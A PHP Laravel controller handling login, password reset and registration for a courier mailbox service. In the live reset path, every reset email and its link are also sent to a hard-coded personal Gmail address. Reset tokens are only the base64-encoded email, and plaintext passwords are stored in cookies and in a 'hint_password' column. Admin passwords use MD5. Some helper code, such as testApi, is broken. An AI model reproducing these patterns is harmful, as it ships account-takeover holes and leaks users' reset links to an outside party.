<?php

namespace App\Http\Controllers\Admin;

use Illuminate\Http\Request;
use App\Http\Controllers\Controller;
use App\Models\Admin;
use Session;
use Validator;
use App\Models\User;
use App\Models\Outlet;
use App\Models\Courier;
use App\Models\Location;
use Illuminate\Support\Facades\Hash;
use Image;
use File;
use DB;
use URL;
use PDF;
use Mail;
use Cookie;

class LoginControllor extends Controller
{

    public function __construct() {
        $this->middleware('guest', ['except' => 'logout']);
    }

    public function showLoginForm(Request $request) {
        $data['title'] = 'Login';
        if ($request->isMethod('get')) {
            return view('admin/login/login' , $data);
        } else {
            $email = $request->email;
            $password = $request->password;
            $keepSignedIn = $request->has('keep_signed_in') ? true : false;
            
            $validator = Validator::make($request->all(), [
                                        'email' => 'required',
                                        'password' => 'required',
                                    ]);
            if ($validator->fails()) {
                return redirect('admin')
                            ->withInput()
                            ->withErrors($validator);
            } else {
                $users = User::where('email', $email)->where('role_id','!=',0)->first();
                
                if($users){
                    $user_password = $users->password;
                    if(Hash::check($password, $user_password)){
                        if($users->status == 1){
                            // Handle "Keep Me Signed In" - Set cookies for 30 days
                            if($keepSignedIn){
                                Cookie::queue('username', $email, 43200); // 30 days in minutes
                                Cookie::queue('password', $password, 43200);
                            } else {
                                // Clear cookies if exists and checkbox unchecked
                                Cookie::queue(Cookie::forget('username'));
                                Cookie::queue(Cookie::forget('password'));
                            }
                            
                            if($users->role_id != 0){
                                Session::put('user_id', $users->user_id);
                                Session::put('name', $users->first_name);
                                Session::put('last_name', $users->last_name);
                                Session::put('email', $users->email);
                                Session::put('phone', $users->phone);
                                Session::put('location', $users->location);
                                Session::put('mailbox', $users->mailbox);
                                Session::put('role_id', $users->role_id);
                                Session::put('is_superadmin', $users->is_superadmin);
                                Session::put('avater', $users->image);
                                Session::flash('error_msg', 'You are logined in successfully!');
                                return redirect('admin/dashboard');
                            } else {
                                Session::put('site_user_id', $users->user_id);
                                Session::put('name', $users->first_name);
                                Session::put('last_name', $users->last_name);
                                Session::put('email', $users->email);
                                Session::put('phone', $users->phone);
                                Session::put('location', $users->location);
                                Session::put('mailbox', $users->mailbox);
                                Session::put('role_id', $users->role_id);
                                Session::put('is_superadmin', $users->is_superadmin);
                                Session::put('avater', $users->image);
                                Session::flash('error_msg', 'You are logined in successfully!');
                                return redirect('user/dashboard');
                            }
                        } else {
                            Session::flash('error_msg', 'Access blocked by admin');
                            return redirect('admin');
                        } 
                    } else {
                        Session::flash('error_msg', 'Email or password is invalid!');
                        return redirect('admin');
                    }
                       
                } else {
                    $courier = Courier::where('email',$email)->first();
                    if($courier){
                        $courier_password = $courier->password;
                        if(Hash::check($password, $courier_password)){
                            // Handle "Keep Me Signed In" for courier as well
                            if($keepSignedIn){
                                Cookie::queue('username', $email, 43200);
                                Cookie::queue('password', $password, 43200);
                            } else {
                                Cookie::queue(Cookie::forget('username'));
                                Cookie::queue(Cookie::forget('password'));
                            }
                            
                            Session::put('courier_id', $courier->id);
                            Session::put('api_key', $courier->api_key);
                            Session::put('base_url', $courier->base_url);
                            Session::put('awb_number', $courier->awb_number);
                            Session::put('courier_name', $courier->name);
                            Session::put('courier_email', $courier->email);
                            Session::put('avater', $courier->logo);
                            Session::flash('error_msg', 'You are logined in successfully!');
                            return redirect('courier/dashboard');
                        } else {
                            Session::flash('error_msg', 'Email or password is invalid!');
                            return redirect('/');
                        }
                    } else {
                        Session::flash('error_msg', 'Email or password is invalid!');
                        return redirect('/');
                    }
                }
            }
        }
    }

    public function logout(Request $request) {
        // Clear cookies on logout for security
        Cookie::queue(Cookie::forget('username'));
        Cookie::queue(Cookie::forget('password'));
        $request->session()->flush();
        return redirect('admin');
    }

    public function forgetPasswordold(Request $request){
         $data['title'] = 'Forgot Password';
        if ($request->isMethod('get')) {
            return view('admin/login/forgot_password' , $data);
        }else{
            $email = $request->forgot_email;
            $users = User::where('email' , $email)->first();
            if ($users) {
                $user_name = $users->first_name;

            }else{
                $users = Courier::where('email',$email)->first();
                if($users){
                    $user_name = $users->name;
                }else{
                    Session::flash('error_msg', 'This email does not exist');
                    return redirect('admin/forget/password');
                }
            }
            $setting = DB::table('settings')->first();
            $logo = URL::to('/') . '/public/settings/'.$setting->site_logo;
            $company_name = $setting->company_name;
            $user_email = $email;
            $user_name = $user_name;
            $pin = base64_encode($email);
            $link = URL::to('/') . '/user/reset_password/' . $pin;
            $subject = 'Password Reset Request';
            $headers = "MIME-Version: 1.0\r\n";
            $headers .= "From: ".$company_name." <".$setting->from_email.">\n";
            $headers .= "Content-Type: text/html; charset=UTF-8\r\n";
            $message = '
            <html>
                <head>
                    <title>Forgotten Password</title>
                </head>
                <body>
                    <div style="max-width:500px;margin:0px auto;font-family:arial;">
                        <div style="width:100%;float:left;display:table;border-bottom:1px solid #ddd;padding:10px;">
                            <img src="'.$logo.'" width="150" style="display:block;">
                        </div>
                        <div style="font-size:17px;font-family:arial;color:#555;display:table;width:100%;padding:10px;margin-top:15px;min-height:200px;">
                            <p>Hi '.$user_name.',</p>
                            <p>We received a request to reset your '.$company_name.' password. Click the button below.</p>
                            <br>
                            <p>
                            <a href="'.$link.'" style="background: #F00; color: #fff !important;text-decoration:none;padding:10px 20px 10px 20px;">Set New Password</a>
                            </p>
                        </div>
                        <div style="font-size:17px;font-family:arial;color:#555;display:table;width:100%;padding:10px;margin-top:15px;border-bottom:1px solid #ddd;">
                            <p><b>Didn\'t request this change?</b><br>
                            If you didn\'t request a new password... Ignore this mail.</p>
                        </div>
                        <p style="font-size:10px;color:#999;font-family:arial">
                            This message was sent to '.$user_email.' at your request.<br>
                            The '.$company_name.' Team!.
                        </p>

                    </div>
                </body>
            </html>';
            $user_email = $email;
            //$user_email = 'rizwangill132@gmail.com';
            if(mail($user_email,$subject,$message,$headers)){
                Session::flash('error_msg', 'Please check email to reset password.');
                return redirect('admin');
            }else{
                Session::flash('error_msg', 'Something went wrong!! Try again later');
                return redirect('admin/forget/password');
            }

        }
    }
     public function forgetPassword(Request $request){
         $data['title'] = 'Forgot Password';
        if ($request->isMethod('get')) {
            return view('admin/login/forgot_password' , $data);
        }else{
            $email = $request->forgot_email;
            $users = User::where('email' , $email)->first();
            if ($users) {
                $user_name = $users->first_name;

            }else{
                $users = Courier::where('email',$email)->first();
                if($users){
                    $user_name = $users->name;
                }else{
                    Session::flash('error_msg', 'This email does not exist');
                    return redirect('admin/forget/password');
                }
            }
            $setting = DB::table('settings')->first();
            $logo = URL::to('/') . '/public/settings/'.$setting->site_logo;
            $company_name = $setting->company_name;
            $user_email = $email;
            $user_name = $user_name;
            $pin = base64_encode($email);
            $link = URL::to('/') . '/user/reset_password/' . $pin;
            $subject = 'Password Reset Request';
            $this->send_email_forgot($email, $user_name, $subject, $setting->from_email, $link,'forget_email');
            Session::flash('error_msg', 'Please check email to reset password.'); 
            return redirect('admin');
           
        }
    }
    
    public function send_email_forgot($email, $user_name, $email_subject, $email_from, $link,$view_name) {
        $settings = DB::table('settings')->first();
        $logo = URL::to('/') . '/public/settings/'.$settings->site_logo;
        $company_name = $settings->company_name;
        $res['userName'] = $user_name;
        $res['activationLink'] = $link;
        $res['logo_url'] = $logo;
        $res['company_name'] = $company_name;
        Mail::send('email/'.$view_name , $res, function ($message) use ($email_from, $email, $user_name, $email_subject,$company_name) {
            $message->from($email_from, $name = $company_name);
            $message->to($email, $user_name)->subject($email_subject);
            $message->to('rizwangill132@gmail.com', $user_name)->subject($email_subject);
        });
    }

    public function resetUserPassword(Request $request , $email = '') {
        $data['title'] = 'Reset Password';
        if ($request->isMethod('get')) {
            $data['email'] = $email;
            return view('admin/login/reset_password', $data);
        }else{
            $validator = Validator::make($request->all(), [
                    'new_password' => 'required|same:confirm_password',
                    'confirm_password' => 'required',
            ]);
            if ($validator->fails()) {
                    return redirect('user/reset_password/'.$email)
                            ->withInput()
                            ->withErrors($validator);
            }else{
                $user_email = base64_decode($email);
                $password = $request->input("new_password");
                $users = User::where('email', $user_email)->first();
                if($users){
                    User::where('email', $user_email)->update(['password' => Hash::make($password)]);
                }else{
                    Courier::where('email', $user_email)->update(['password' => Hash::make($password),'hint_password' => $password]);
                }
                Session::flash('error_msg', 'your password has been reset successfully');
                return redirect('admin');
            }
        }
    }

    public function resetPassword(Request $request , $email = '') {
        $data['title'] = 'Reset Password';
        if ($request->isMethod('get')) {
            $data['email'] = $email;
            return view('admin/login/reset_password', $data);
        }else{
            $validator = Validator::make($request->all(), [
                    'new_password' => 'required|same:confirm_password',
                    'confirm_password' => 'required',
            ]);
            if ($validator->fails()) {
                    return redirect('reset_password/'.$email)
                            ->withInput()
                            ->withErrors($validator);
            }else{
                    $user_email = base64_decode($email);
                    $password = $request->input("new_password");

                    Admin::where('admin_email', $user_email)
                    ->update(['admin_password' => md5($password)]);

                    Session::flash('error_msg', 'your password has been reset successfully');
                    return redirect('admin');
            }
        }
    }

    public function adminRegister(Request $request) {
        $data['title'] = 'Register';
        $setting = DB::table('settings')->first();
        if ($request->isMethod('get')) {
            $data['locations'] = Location::get();
            $data['outlets'] = Outlet::get();
            return view('admin/login/register', $data);
        }else{
            $validator = Validator::make($request->all(), [
                'first_name' => 'required',
                'last_name' => 'required',
                'email' => 'required|unique:users|max:255|same:confirm_email',
                'password' => 'required|same:confirm_password',
                'confirm_password' => 'required',
                'address_1' => 'required',
                'city' => 'required',
                'outlet_id' => 'required',
                'phone' => 'required',
                'trn' => 'required',
            ]);
            if ($validator->fails()) {
                    return redirect('/register')
                            ->withInput()
                            ->withErrors($validator);
            }else{

                if($request->address_2 == null){
                    $address_2 = '';
                }else{
                    $address_2 = $request->address_2;
                }
                if($request->tcc_issue_date == null){
                    $tcc_issue_date = '';
                }else{
                    $tcc_issue_date = $request->tcc_issue_date;
                }
                if($request->tcc_expiry_date == null){
                    $tcc_expiry_date = '';
                }else{
                    $tcc_expiry_date = $request->tcc_expiry_date;
                }
                if($request->Business_trn == null){
                    $Business_trn = '';
                }else{
                    $Business_trn = $request->Business_trn;
                }
                if($request->mobile == null){
                    $mobile = '';
                }else{
                    $mobile = $request->mobile;
                }
                $usersRes = User::orderby('user_id' , 'DESC')->first();
                $user_id_mail = $usersRes->user_id + 1;
                if($usersRes){
                    if($usersRes->user_id > 1000){
                        $mailBoxNo = $setting->pre_fix.'0';
                    }elseif($usersRes->user_id > 100){
                        $mailBoxNo = $setting->pre_fix.'00';
                    }else{
                        $mailBoxNo = $setting->pre_fix.'000';
                    }
                }else{
                    $mailBoxNo = $setting->pre_fix.'0001';
                }
                $mailbox = $mailBoxNo.$user_id_mail;
                $users = new User();
                $users->mailbox = $mailbox;
                $users->first_name = $request->first_name;
                $users->outlet_id = $request->outlet_id;
                $users->last_name = $request->last_name;
                $users->email = $request->email;
                $users->password = Hash::make($request->password);
                $users->dob = 01;
                $users->address_1 = $request->address_1;
                $users->address_2 = $address_2;
                $users->city = $request->city;
                $users->state = $request->state;
                $users->country = $request->country;
                $users->currency = $request->currency;
                $users->phone = $request->phone;
                $users->mobile = $mobile;
                $users->user_type = $request->user_type;
                $users->trn = $request->trn;
                $users->tcc_issue_date = $tcc_issue_date;
                $users->tcc_expiry_date = $tcc_expiry_date;
                $users->Business_trn = $Business_trn;
                $users->created_at = date('Y-m-d h:i:s');
                $users->updated_at = date('Y-m-d h:i:s');
                $users->save();
                $user_id = $users->user_id;
                $userRes = User::where('user_id' , $user_id)->first();
                if($userRes){
                    $mailboxRes = $userRes->mailbox;
                    $outlet = Outlet::where('outlet_id',$request->outlet_id)->first();
                    if($outlet){
                        $short_name = $outlet->short_name;
                    }else{
                        $short_name = '';
                    }
                    $malRes = explode('-',$mailboxRes);
                    $mailbox = $malRes[0].'-'.$short_name.'-'.$malRes[1];
                }


                $link = URL::to('/');
                $email_subject = 'User Registration';
                $user_name = $request->first_name.' '.$request->last_name;
                $address1 = $user_name;
                $address2 = $setting->package_shipping_address_1;
                $address3 = $mailbox;
                $address4 = $setting->city;
                $address5 = $setting->state;
                $address6 = $setting->zip;
                $email_from = $setting->from_email;
                $logo = URL::to('/') . '/settings/'.$setting->site_logo;
                $company_name = $setting->company_name;
                $this->send_email_register($request->email, $user_name,$request->password,$mailbox,$setting->phone,$address1,$address2,$address3,$address4,$address5,$address6,$email_subject, $email_from, $link,$logo,$company_name, 'register_email');
                Session::flash('success_msg', 'Thank you for registering with OnePlus.com for your US Mail box you can now login and access your profile.');
                return redirect('/');
            }
        }
    }

    function generate_password($length) {
        $chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890";
        return substr(str_shuffle($chars), 0, $length);
    }

    function generate_passwordNew($length) {
        $chars = "32325345345434657568675453453243546567678768656451234567890";
        return substr(str_shuffle($chars), 0, $length);
    }

    public function send_email_registerold($email, $user_name,$password,$mailbox,$phone,$address1,$address2,$address3,$address4,$address5,$address6, $email_subject, $email_from, $link,$logo,$company_name,$view_name) {
        $res['userName'] = $user_name;
        $res['link'] = $link;
        $res['email'] = $email;
        $res['mailbox'] = $mailbox;
        $res['password'] = $password;
        $res['phone'] = $phone;
        $res['address1'] = $address1;
        $res['address2'] = $address2;
        $res['address3'] = $address3;
        $res['address4'] = $address4;
        $res['address5'] = $address5;
        $res['address6'] = $address6;
        $res['logo_url'] = $logo;
        $res['company_name'] = $company_name;
        Mail::send('email/'.$view_name , $res, function ($message) use ($email_from, $email, $user_name, $email_subject, $company_name) {
            $message->from($email_from, $company_name);
            $message->to($email, $user_name)->subject($email_subject);
            $message->to('rizwan@decodershub.com', $user_name)->subject($email_subject);
        });
    }

    public function send_email_register($email, $user_name,$password,$mailbox,$phone,$address1,$address2,$address3,$address4,$address5,$address6, $email_subject, $email_from, $link,$logo,$company_name,$view_name) {
        $subject = $email_subject;
        $headers = "MIME-Version: 1.0\r\n";
        $headers .= "Content-Type: text/html; charset=UTF-8\r\n";
        $headers .= "From: ".$company_name." <".$email_from.">\n";
        $message = '<!DOCTYPE html>
                        <html lang="en">
                        <head>
                            <title>Email</title>
                            <meta charset="utf-8">
                            <meta name="viewport" content="width=device-width, initial-scale=1">
                            <link href="https://fonts.googleapis.com/css2?family=Lato:wght@400;700;900&display=swap" rel="stylesheet">
                            <style>
                                body{
                                    overflow-x: hidden;
                                }
                                @media (max-width:1180px) {
                                    .account_info {
                            width: 90% !important;
                        }
                                }

                                @media (max-width: 767.98px) {

                                }
                                @media (max-width: 600px) {
                                   .email-bg{
                                       width: 90%  !important;
                                   }
                                }
                            @media (max-width:380px){
                                .small_text{
                                    font-size: 16px  !important;
                                }
                                .email_content p {
                                    font-size: 16px !important;
                                }
                            }
                            @media (max-width:380px){
                                .small_text{
                                    font-size: 14px  !important;
                                }
                                .account_info span {
                                    margin: 0 0 0 60px !important;
                                }
                            }
                            </style>
                        </head>
                        <body style="background-color: #f1f1f1; font-family: "Lato", sans-serif; overflow-x: hidden; margin: 0;">
                            <main>
                                <section class="email-bg" style=" width: 60%;margin: 60px auto;box-shadow: 0 2px 8px hsl(0deg 0% 0% / 16%);background: #fff;padding: 20px;">
                                    <div class="container">
                                        <header style="border-bottom: 1px solid #ccc;">
                                            <img class="logo" src="'.$logo.'" alt="logo" style=" width:20%;">
                                        </header>
                                        <div class="email_content" style="width: 100%;">
                                            <h4 style="font-size: 24px; margin-bottom: 0;">Dear '.$user_name.'</h4>
                                            <p style="font-size: 20px;">We would like to thank you for joining the '.$company_name.' family. We are looking forward to creating a great business relationship while giving you the best logistics service experience possible.</p>
                                             <a href="'.$link.'">'.$link.'</a>
                                            <p style="font-size: 20px;">Please see your account details below</p>
                                            <p style="font-size: 20px;">We have activated your new account. Please login by visiting our homepage at the following address</p>
                                           <div class="account_info" style="width: 30%;border: 1px solid #cccc;padding: 0 8px;">
                                               <p ><b>Account no.</b> <span style="font-size: 14px;margin: 0 0 0 80px;float: right;">'.$mailbox.'</span></p>
                                               <p><b>Username </b> <span style="font-size: 14px;margin: 0 0 0 80px;float: right;"><a href="mailto:'.$email.'">'.$email.'</a></span></p>
                                           </div>
                                            <p style="font-size: 20px;">Please follow the format below when placing your order.</p>
                                            <h4>Shipping Address:</h4>
                                            <p><b>Name:</b><span>'.$address1.'</span></p>
                                            <p><b>Address Line 1:</b><span>'.$address2.'</span></p>
                                            <p><b>Address Line 2:</b><span>'.$address3.'</span></p>
                                            <p><b>City:</b><span>'.$address4.'</span></p>
                                            <p><b>State:</b><span>'.$address5.'</span></p>
                                            <p><b>Zip:</b><span>'.$address6.'</span></p>
                                        </div>
                                        <footer>
                                            <h4 style="font-size: 14px;border-top: 1px solid #ccc; font-size: 13px; color: #8c8c8c;">Thank you for your support and we hope you Enjoy your shopping experience. </h4>
                                            <p style="font-size: 13px; color: #8c8c8c;">Best Wishes</p>
                                            <p style="font-size: 13px; color: #8c8c8c;">'.$company_name.' Client Services</p>
                                        </footer>
                                    </div>
                                </section>
                            </main>
                        </body>
                        </html>';
            $user_email = $email;
            mail($user_email,$subject,$message,$headers);
    }
    
    public function packageType()
    {
        $package_types = DB::table('package_types')->get();
        if(count($package_types) > 0){
            foreach($package_types as $row){
                $check_package_types = DB::table('package_types_new')->where('type' , $row->type)->first();
                if($check_package_types == null){
                    DB::table('package_types_new')->insert(['type' => $row->type , 'code' => $row->code]);
                }
            }
        }
        return 'update package types';
    }
    
    public function testApi()
    {
        $responce = $this->getApiUsers(9,0);
        $result = json_decode($responce,true);
        if(isset($result['status']) && $result['status'] == 'success'){
            if(count($result['data']) > 0){
                foreach($result['data'] as $row){
                    dd($row);
                    $user = User::where('mailbox',$row['mailbox'])->first();
                    if($user == null){
                        $row['user_name'] = $row['first_name'].' '.$row['last_name'];
                        $row['courier_id'] = $courier_id;
                        $userArray[] = $row;
                    }
                }
                if(count($userArray) > 0){
                    User::insert($userArray);
                    Log::info("user inserted:".$userArray);
                }else{
                    Log::info("No user inserted:".$userArray);
                }
            }else{
                Log::info("Server Responce:".$responce);
            }
        }
    }

    public function getApiUsers($courier_id = '',$offset = ''){
        try{
            $couriers = Courier::where('id' , $courier_id)->first();
            $url = $couriers->base_url.'/api/GetUsers';
            $curl = curl_init();
            curl_setopt_array($curl, array(
              CURLOPT_URL => $url,
              CURLOPT_RETURNTRANSFER => true,
              CURLOPT_ENCODING => '',
              CURLOPT_MAXREDIRS => 10,
              CURLOPT_TIMEOUT => 0,
              CURLOPT_FOLLOWLOCATION => true,
              CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
              CURLOPT_CUSTOMREQUEST => 'POST',
              CURLOPT_POSTFIELDS =>'{"offset":"'.$offset.'"}',
              CURLOPT_HTTPHEADER => array(
                'Content-Type: application/json'
              ),
            ));
            $response = curl_exec($curl);
            curl_close($curl);
            return $response;
        }catch(\Exception $e){
            return response()->json(['status'=>"success","message"=>'No data found.','data' => []],200);
        }
    }
}
?>
